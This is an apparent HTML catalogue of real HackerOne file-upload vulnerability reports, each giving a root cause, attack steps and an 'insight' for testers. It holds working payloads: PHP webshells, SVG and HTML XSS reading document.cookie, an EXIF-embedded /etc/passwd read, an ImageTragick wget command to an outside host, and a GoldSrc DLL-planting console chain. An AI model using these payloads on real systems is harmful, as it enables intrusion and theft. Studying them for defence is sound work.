+<h4>Method</h4><ol><li>Craft a malformed .sav whose internal member unpacks to a path like SAVE/test.HL1.dll -- the '.HL1' substring satisfies the extension check but the real trailing extension is .dll.</li><li>Trigger unpack: place fakeresource.sav in %gamedir%/SAVE/ and run `load fakeresource` in console.</li><li>Remotely: a malicious server downloads the .sav to a connected client, then via SVC_StuffText/SVC_Director drives client console commands to create target dirs, set gamedir, and load the file so the unpacked DLL lands where the engine loads client libraries.</li><li>On engine restart the client loads the attacker DLL from cl_dlls/client.dll -&gt; code execution on the client.</li></ol>
+<div class="pre"># Console commands the malicious server injects via SVC_StuffText / SVC_Director:
+_setgamedir %gamedir%_downloads;_restart
+# then on reconnect:
+logsdir SAVE/test.HL1/cl_dlls;log on;_setgamedir %gamedir%_downloads/SAVE/test.HL1;load fakeresource;_restart
+# fakeresource.sav unpacks -&gt; SAVE/test.HL1/cl_dlls/client.dll (arbitrary DLL loaded into engine)</div>
+<p class="insight"><b>Insight —</b> When a filename/extension filter uses strstr/contains instead of an endswith/anchored check, place the allowed token in the middle of the path and append the real dangerous extension. Also: any 'allowed temp extension' during archive/save extraction is a file-write primitive if the path isn't sandboxed.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/458842" target="_blank" rel="noopener">hackerone.com/reports/458842</a></span><a class="src" href="#report-458842" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-232174" style="--sv:var(--sev-high)" data-sev="3" data-votes="86" data-bounty="5000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>SVG element-whitelist bypass via XML entity/DOCTYPE</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#232174</b> · shopify · USD 5000 · 86 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span><span>Chain <b>Malicious SVG icon -&gt; whitelist bypass -&gt; stored XSS o</b></span><span>Tag <b>file-upload</b></span><span>Tag <b>oauth</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An SVG upload is normally restricted to a whitelist of allowed elements/attributes, but adding an XML entity declaration (DOCTYPE/&lt;!ENTITY&gt;) causes the whitelist enforcement to be skipped, letting the SVG keep an onload handler that fires in the admin/partner origin.</p>
+<h4>Method</h4><ol><li>Create a Sales Channel app that accepts an SVG navigation icon (whitelist-validated)</li><li>Include a DOCTYPE with an &lt;!ENTITY&gt; declaration plus &lt;svg onload=...&gt;</li><li>Upload; the entity disables whitelist enforcement so onload survives</li><li>Fires on partners.shopify.com and on any shop admin that OAuth-authorizes the app</li></ol>
+<div class="pre">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE svg [ &lt;!ENTITY elem ""&gt; ]&gt;
+&lt;svg onload="alert(document.domain);" height="16" width="16"&gt;
+  &amp;elem;
+&lt;/svg&gt;</div>
+<p class="insight"><b>Insight —</b> When an SVG/HTML sanitizer applies an element allow-list, probe parser edge cases: a DOCTYPE/entity declaration can flip the sanitizer into a mode where it stops enforcing the whitelist. This turns a 'safe icon upload' into stored XSS that propagates to every tenant that installs the app (via OAuth authorize).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/232174" target="_blank" rel="noopener">hackerone.com/reports/232174</a></span><a class="src" href="#report-232174" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-765679" style="--sv:var(--sev-high)" data-sev="3" data-votes="59" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Stored XSS via SVG upload masqueraded as raster image, served inline</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#765679</b> · outpost · none · 59 votes · resolved</div>
+<div class="taxo"><span>Program <b>outpost</b></span><span>Surface <b>web</b></span><span>Chain <b>file upload -&gt; inline SVG render -&gt; stored XSS -&gt; c</b></span><span>Tag <b>file-upload</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Upload endpoints validate extension/declared type but not real content; an SVG carrying onload=... uploaded as .png/.gif/.bmp is stored and served with Content-Disposition: inline, executing JS when a victim opens it.</p>
+<h4>Method</h4><ol><li>Craft an SVG with an event handler (onload) that runs JS</li><li>Rename it to .png/.gif/.bmp (or set image Content-Type) to pass the format check</li><li>Send/upload it so a victim opens the file directly in-browser</li></ol>
+<div class="pre">&lt;svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="2560" height="1600" onload="alert(document.cookie)"&gt;</div>
+<p class="insight"><b>Insight —</b> Any upload served inline (not attachment) with attacker-controlled bytes is an XSS sink; SVG is the prime vector because it is XML+script. Bypass format checks by keeping SVG bytes under an image extension/MIME.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/765679" target="_blank" rel="noopener">hackerone.com/reports/765679</a></span><a class="src" href="#report-765679" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-412481" style="--sv:var(--sev-high)" data-sev="3" data-votes="46" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Upload .shtml/.html bypassing filter -&gt; SSI + config/info disclosure</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#412481</b> · starbucks · none · 46 votes · resolved</div>
+<div class="taxo"><span>Program <b>starbucks</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An IIS upload endpoint validates by extension but allows html/shtml; because the server processes SSI in .shtml, an attacker uploads a file that is served and parsed, disclosing internal IP, physical paths, and web.config.</p>
+<h4>Method</h4><ol><li>Find an upload endpoint that accepts a file; change the filename extension to .shtml (or .html).</li><li>Upload content; retrieve it from the returned temp path in a browser so the server renders it.</li><li>Read leaked SERVER_NAME/REMOTE_ADDR/DOCUMENT paths and web.config via SSI/server variables.</li></ol>
+<div class="pre">POST /recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file HTTP/1.1
+Host: TARGET
+Content-Type: multipart/form-data; boundary=---B
+
+-----B
+Content-Disposition: form-data; name="...upload_file_inputbox"; filename="xxx.shtml"
+Content-Type: text/html
+
+&lt;!--#echo var="DOCUMENT_NAME"--&gt;
+-----B--</div>
+<p class="insight"><b>Insight —</b> An upload filter that only blocks obvious script extensions still lets through server-parsed formats (.shtml for SSI, .html for stored XSS). Try .shtml/.stm on IIS/Apache and check whether the uploaded file is rendered rather than downloaded.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/412481" target="_blank" rel="noopener">hackerone.com/reports/412481</a></span><a class="src" href="#report-412481" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-357858" style="--sv:var(--sev-high)" data-sev="3" data-votes="43" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Webshell upload via extension-rename + EXIF-embedded PHP</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#357858</b> · monero · none · 43 votes · resolved</div>
+<div class="taxo"><span>Program <b>monero</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A profile-image upload lacks real image validation and stores files under the user-supplied name/extension in a web-served directory, so a PHP payload embedded in image metadata and saved with a .php extension executes as a webshell.</p>
+<h4>Method</h4><ol><li>Embed PHP in an image metadata field with exiftool</li><li>Rename the image to .php</li><li>Upload it; even on a 500 error the file lands in /uploads/profile/</li><li>Recover the path using the response timestamp -&gt; [username][timestamp].php</li></ol>
+<div class="pre">exiftool -documentname='&lt;?php echo file_get_contents("/etc/passwd"); ?&gt;' picture.png
+# rename picture.png -&gt; shell.php, upload, then visit:
+https://TARGET/uploads/profile/[USERNAME][timestamp].php</div>
+<p class="insight"><b>Insight —</b> Two independent failures make upload RCE: (1) no magic-byte/content validation and (2) attacker controls stored extension. Even when the upload errors out, the file is often already written - guess the path from the response time/username pattern. EXIF fields are a clean place to smuggle PHP past image-only checks.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/357858" target="_blank" rel="noopener">hackerone.com/reports/357858</a></span><a class="src" href="#report-357858" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-299424" style="--sv:var(--sev-high)" data-sev="3" data-votes="34" data-bounty="3000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>SVG upload XSS: XML entity disables element/attribute whitelist</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#299424</b> · shopify · USD 3000 · 34 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span><span>Chain <b>malicious app icon -&gt; stored XSS on partner dashboard and</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An SVG uploader enforces an element/attribute whitelist, but the presence of any XML entity in the document causes the sanitizer to stop enforcing the whitelist, letting &lt;script&gt;/onload through and yielding stored XSS wherever the SVG is served.</p>
+<h4>Method</h4><ol><li>Find an SVG upload constrained by a design/element whitelist (icons, avatars)</li><li>Include an XML entity / comment construct so the sanitizer skips whitelist enforcement</li><li>Embed a &lt;script&gt; and upload; XSS fires where the SVG renders (partner dashboard, shop admin)</li></ol>
+<div class="pre">&lt;svg&gt;&lt;!--?php "--&gt;&lt;script&gt;confirm(20)&lt;/script&gt;?&amp;gt;&lt;/svg&gt;</div>
+<p class="insight"><b>Insight —</b> SVG sanitizers frequently mis-handle XML entities/DOCTYPE/comments; slipping one in can flip the parser out of whitelist mode. Any user-rendered SVG (icons, avatars, logos) is an XSS sink — test entity/comment tricks, not just a bare &lt;script&gt;.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/299424" target="_blank" rel="noopener">hackerone.com/reports/299424</a></span><a class="src" href="#report-299424" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-135072" style="--sv:var(--sev-high)" data-sev="3" data-votes="32" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>ImageMagick MVG delegate command injection via image upload (ImageTragick, CVE-2016-3714)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#135072</b> · security · awarded · 32 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A profile-picture upload passes files to ImageMagick without verifying they are real images. ImageMagick parses ASCII as MVG (Magic Vector Graphics); its 'image' directive supports delegates (e.g. https:) whose handler shell-invokes curl, and the URL is not shell-escaped - so a crafted .gif runs OS commands.</p>
+<h4>Method</h4><ol><li>Upload an ASCII MVG file with an image extension (x.gif)</li><li>Use an image over directive with an https: delegate URL containing a backtick command</li><li>ImageMagick's delegate handler executes the injected command</li></ol>
+<div class="pre">push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 1.2.3.4:1337 &gt; /dev/null`'
+pop graphic-context</div>
+<p class="insight"><b>Insight —</b> For any image-processing target, test both ImageTragick vectors: MVG delegate command injection (this, via `...` in a delegate URL) and the Ghostscript %pipe% PostScript trick. Fix = magic-byte allowlist before ImageMagick and blocking outbound connections from image workers.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/135072" target="_blank" rel="noopener">hackerone.com/reports/135072</a></span><a class="src" href="#report-135072" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-698789" style="--sv:var(--sev-high)" data-sev="3" data-votes="19" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unauthenticated arbitrary file upload</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#698789</b> · deptofdefense · none · 19 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An unauthenticated /upload.php endpoint accepted arbitrary files and the uploaded file was retrievable from a known path, enabling stored XSS and attacker content hosting (and potential code execution if executable types are served).</p>
+<h4>Method</h4><ol><li>Discover the upload endpoint (e.g. /upload.php) requiring no auth</li><li>Upload a test file; note the success message and storage path</li><li>Retrieve the file from its served path (e.g. /delete.me) to confirm</li></ol>
+<div class="pre">POST /upload.php  (multipart file, no auth)  -&gt; retrievable at /&lt;known-path&gt;</div>
+<p class="insight"><b>Insight —</b> Probe for unauthenticated upload endpoints and always confirm the web-accessible landing path; from there escalate by testing executable extensions, HTML/SVG for stored XSS, and content-type/double-extension bypasses.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/698789" target="_blank" rel="noopener">hackerone.com/reports/698789</a></span><a class="src" href="#report-698789" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1850065" style="--sv:var(--sev-high)" data-sev="3" data-votes="14" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unrestricted upload via client-side-only extension/size check</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1850065</b> · deptofdefense · none · 14 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">File extension and size are validated only in the browser; the server accepts whatever is sent, so intercepting the upload and swapping the extension after the client check bypasses all restrictions.</p>
+<h4>Method</h4><ol><li>Register/login to the bug-report feature</li><li>Attach a file with an allowed extension</li><li>Submit and intercept the multipart request in a proxy</li><li>Rewrite the filename extension to a disallowed one (and inflate size past the limit)</li><li>Forward - upload succeeds</li></ol>
+<div class="pre">Content-Disposition: form-data; name="attachment"; filename="poc.exe"
+Content-Type: application/octet-stream
+&lt;malicious bytes&gt;</div>
+<p class="insight"><b>Insight —</b> Whenever an upload restriction is enforced, re-test it at the HTTP layer: the check that blocks in the UI is frequently absent server-side. Malicious attachments delivered to support/triage agents are the impact vector.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1850065" target="_blank" rel="noopener">hackerone.com/reports/1850065</a></span><a class="src" href="#report-1850065" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-900179" style="--sv:var(--sev-high)" data-sev="3" data-votes="14" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>HTML file upload served inline = stored XSS (script runs from same origin)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#900179</b> · deptofdefense · none · 14 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span><span>Tag <b>xss</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An upload feature accepts .html files and later serves them inline with Content-Type text/html from the application's own origin; the browser renders attacker JavaScript in that origin = stored XSS (and, where the app also interprets uploaded server-side scripts, a path to a webshell).</p>
+<h4>Method</h4><ol><li>Find any upload that returns a direct/openable link to your file (attachments, avatars, email signatures, theme assets, form attachments).</li><li>Upload an .html file containing a script payload.</li><li>Retrieve the file's URL and open it; if the server responds Content-Type: text/html the script executes in the app origin.</li><li>Escalate: exfiltrate document.cookie / act on behalf of any user who opens the file; test server-side script extensions (.php/.phtml) for execution.</li></ol>
+<div class="pre">&lt;html&gt;
+&lt;center&gt;&lt;h1&gt;defaced&lt;/h1&gt;&lt;/center&gt;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;/html&gt;
+&lt;!-- served back as Content-Type: text/html from the app origin -&gt; stored XSS --&gt;</div>
+<p class="insight"><b>Insight —</b> An upload filter that only blocks 'executable' server-side extensions still bleaks stored XSS if it lets .html/.svg/.xml through AND serves them inline. The tell is the response Content-Type on the file's URL: text/html (or image/svg+xml) = XSS; the fix programs applied was forcing text/plain or image/png / Content-Disposition: attachment. Always fetch the uploaded file's link and inspect its Content-Type header rather than trusting that 'it's just an image host'.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/900179" target="_blank" rel="noopener">hackerone.com/reports/900179</a></span><a class="src" href="#report-900179" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1380157" style="--sv:var(--sev-high)" data-sev="3" data-votes="13" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CSP unsafe-inline bypass via self-hosted uploaded JS</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1380157</b> · rocket_chat · none · 13 votes · resolved</div>
+<div class="taxo"><span>Program <b>rocket_chat</b></span><span>Surface <b>web</b></span><span>Chain <b>HTML injection -&gt; upload JS same-origin -&gt; srcdoc scri</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">CSP blocks inline scripts but allows self-origin scripts. The file-upload feature accepts JS content-types and serves the file from the same origin, so an attacker uploads a .js payload and loads it with &lt;script src&gt;. A script-tag filter on messages is bypassed with an iframe srcdoc.</p>
+<h4>Method</h4><ol><li>Upload payload.js via file upload with content-type application/javascript</li><li>Via an HTML-injection/XSS sink, include it same-origin with a script src tag</li><li>If script tags are stripped from the sink, use an iframe srcdoc to smuggle the include</li></ol>
+<div class="pre">&lt;iframe srcdoc="&amp;#x3c;script src='/file-upload/&lt;UPLOAD_ID&gt;/payload.js?download'&gt;&lt;/script&gt;"&gt;</div>
+<p class="insight"><b>Insight —</b> A same-origin file-upload endpoint is a CSP bypass primitive: if 'self' is script-src and uploads are served from the app origin with a script content-type, uploaded JS satisfies CSP. Combine with iframe srcdoc to defeat script-tag filters.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1380157" target="_blank" rel="noopener">hackerone.com/reports/1380157</a></span><a class="src" href="#report-1380157" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-698793" style="--sv:var(--sev-high)" data-sev="3" data-votes="11" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unauthenticated arbitrary file upload endpoint</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#698793</b> · deptofdefense · none · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>unauth upload -&gt; served content -&gt; stored XSS / conten</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An upload endpoint (upload.php) is reachable without authentication and stores the file at a predictable/leaked path, letting anyone host arbitrary content on the target (path to stored XSS / code execution depending on handler).</p>
+<h4>Method</h4><ol><li>Discover upload.php (directory brute-force / JS refs)</li><li>POST a test file; the success message leaks internal storage paths</li><li>Browse to the leaked path (e.g. /delete.me) to confirm the file is served</li><li>Escalate: upload HTML/SVG for stored XSS or a server-executable type if the path executes</li></ol>
+<div class="pre">POST /upload.php HTTP/1.1
+Host: TARGET
+Content-Type: multipart/form-data; boundary=x
+
+--x
+Content-Disposition: form-data; name="file"; filename="delete.me"
+Content-Type: image/png
+
+&lt;file bytes&gt;
+--x--
+# then GET https://TARGET/&lt;leaked internal path&gt;/delete.me</div>
+<p class="insight"><b>Insight —</b> Unauthenticated upload endpoints are high value even before proving RCE: the success response often leaks the web/storage path. Always fuzz for upload.php/handlers and read the response for internal paths, then test served content-type for XSS/exec.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/698793" target="_blank" rel="noopener">hackerone.com/reports/698793</a></span><a class="src" href="#report-698793" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-508894" style="--sv:var(--sev-high)" data-sev="3" data-votes="11" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Download validation skipped for HTTP + non-generic resource types (GoldSrc arbitrary client DLL)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#508894</b> · valve · awarded · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>valve</b></span><span>Surface <b>desktop</b></span><span>Chain <b>Malicious server sets sv_downloadurl -&gt; client HTTP-downl</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The strong filename check (IsSafeFileToDownload) is only applied to 'generic' resources; other resource types (sound/model/eventscript/...) rely on the weak CL_CheckFile which only rejects '..' and 'server.cfg'. Worse, files fetched over HTTP (sv_downloadurl) skip the safety check entirely, so a malicious server can push any file to the client mod folder.</p>
+<h4>Method</h4><ol><li>As the server, set the client's sv_downloadurl to attacker HTTP host.</li><li>Advertise a forbidden-extension file under a non-generic resource type so IsSafeFileToDownload is not called: SV_AddResource(t_eventscript, filename, size, RES_FATALIFMISSING, 0) with filename = bin\\TrackerUI.dll.</li><li>Host bin\\TrackerUI.dll on the sv_downloadurl server.</li><li>Client connects, downloads the DLL over HTTP (no validation), and client.dll loads TrackerUI.dll in its Initialize function on next launch -&gt; RCE.</li></ol>
+<div class="pre">// Server-side: register a forbidden file as a non-generic resource type
+SV_AddResource(t_eventscript, "bin\\TrackerUI.dll", FS_FileSize("bin\\TrackerUI.dll"), RES_FATALIFMISSING, 0);
+// client: sv_downloadurl http://ATTACKER  -&gt; HTTP fetch bypasses IsSafeFileToDownload entirely
+
+// Root-cause fix (missing check in CL_CheckFile):
+if (!IsSafeFileToDownload(pFileName)) { Con_DPrintf("Refusing to download restricted file.\n"); return 1; }</div>
+<p class="insight"><b>Insight —</b> Look for security checks that are only wired into ONE of several code paths: an alternate transport (HTTP vs UDP/netchan) or an alternate object/resource type frequently skips the validator that the 'main' path enforces. Diff every download/upload path for the same guard.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/508894" target="_blank" rel="noopener">hackerone.com/reports/508894</a></span><a class="src" href="#report-508894" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-813395" style="--sv:var(--sev-high)" data-sev="3" data-votes="9" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unrestricted upload on support-request form -&gt; staff-triggered RCE</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#813395</b> · deptofdefense · none · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>Upload -&gt; staff opens attachment or browses stored file -</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A public request/ticket form accepts arbitrary file types (only a &lt;5MB size limit, no extension/content-type allowlist); attachments are delivered to and opened by staff, or may be reachable in the web root.</p>
+<h4>Method</h4><ol><li>Find a public request/support/wizard form with an attachment field</li><li>Upload an executable/.php/.phtml instead of the expected image/doc; it is accepted</li><li>Submit; staff downloads/opens the attachment (client-side RCE) or attacker locates it under web root for a webshell</li></ol>
+<div class="pre">POST /___SubmitRequest/Index.cfm?fwa=wizardform
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: application/octet-stream
+&lt;?php system($_GET['c']); ?&gt;</div>
+<p class="insight"><b>Insight —</b> Any form that emails/queues an attachment to an internal human is an upload sink even without direct web-root exec: malicious Office/HTA/exe files opened by staff = client-side RCE. Test extension allowlist, content sniffing, and whether the stored path is guessable/browsable.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/813395" target="_blank" rel="noopener">hackerone.com/reports/813395</a></span><a class="src" href="#report-813395" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-678727" style="--sv:var(--sev-high)" data-sev="3" data-votes="5" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Upload PHP into data dir served under web root -&gt; RCE</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#678727</b> · nextcloud · none · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span><span>Chain <b>authenticated upload -&gt; predictable web-root path -&gt; d</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">With the default datadirectory placed inside the Nextcloud web root, an authenticated non-admin can upload a .php file; because the data path is web-served and the username-based path is predictable, requesting it directly executes the PHP (also HTML -&gt; stored XSS).</p>
+<h4>Method</h4><ol><li>Log in as a low-priv user (name 'attacker')</li><li>Upload shell.php via the normal file UI</li><li>Browse directly to https://HOST/data/attacker/files/shell.php to execute it</li></ol>
+<div class="pre">POST upload shell.php  (&lt;?php system($_GET['c']); ?&gt;)
+GET https://HOST/data/&lt;username&gt;/files/shell.php?c=id</div>
+<p class="insight"><b>Insight —</b> When a file store lives under the web root and paths are predictable (username/files/name), 'view-only' uploads become RCE; check whether uploaded files execute vs download, and whether the data dir is web-reachable.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/678727" target="_blank" rel="noopener">hackerone.com/reports/678727</a></span><a class="src" href="#report-678727" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-865354" style="--sv:var(--sev-high)" data-sev="3" data-votes="5" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unrestricted upload in support form -&gt; stored XSS on support agent</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#865354</b> · deptofdefense · none · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>arbitrary file upload -&gt; stored XSS in staff browser -&gt</b></span><span>Tag <b>file-upload</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A support-request form accepts arbitrary file types and later serves them for download/preview, so an uploaded .svg/.html executes JavaScript in the browser of the support representative who opens it (stored XSS via file upload), and executables can be delivered too.</p>
+<h4>Method</h4><ol><li>Create/sign in to an account and open the support/ticket feature</li><li>Upload a file with no server-side type allowlist - .svg or .html containing a script</li><li>Submit; files are downloadable/openable from the ticket by staff</li><li>When the support agent opens the .svg in a browser, the XSS fires in the app origin</li><li>Escalate: swap alert() for window.location redirect to a fake login clone to harvest staff credentials</li></ol>
+<div class="pre">&lt;!-- malicious.svg --&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/&gt;</div>
+<p class="insight"><b>Insight —</b> File-upload endpoints that are consumed by internal/support staff are high-value stored-XSS sinks - the victim is a privileged user. Test .svg and .html (served inline) whenever uploads lack a strict extension/content-type allowlist and are opened in-browser; impact is agent account compromise / credential phishing, not just self-XSS.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/865354" target="_blank" rel="noopener">hackerone.com/reports/865354</a></span><a class="src" href="#report-865354" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-214449" style="--sv:var(--sev-high)" data-sev="3" data-votes="0" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reaching a Pillow heap overflow through a Content-Length restriction bypass</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#214449</b> · gratipay · none ·  votes · resolved</div>
+<div class="taxo"><span>Program <b>gratipay</b></span><span>Surface <b>web</b></span><span>Chain <b>Content-Length restriction bypass -&gt; oversized image reac</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">gip.rocks used an outdated Pillow (2.9.0) vulnerable to heap overflows in image decoding. A separate Content-Length restriction bypass let an oversized image payload (788480 bytes) past the size gate and into Image.open()/resize(), reaching the vulnerable native decode path.</p>
+<h4>Method</h4><ol><li>Identify server-side image processing using a known-vulnerable image library version (Pillow 2.9.0)</li><li>Bypass the upload size gate by sending a Content-Length smaller than the real body (the CL-restriction bypass)</li><li>Deliver a crafted .pcd/image payload that triggers the library heap overflow during resize()</li></ol>
+<div class="pre">import requests
+requests.post('http://TARGET/v1',
+  data=open('payload.pcd','rb').read(),
+  headers={'Content-Type':'image/jpeg','Content-Length':' '})  # value smaller than 262144 to bypass the size check</div>
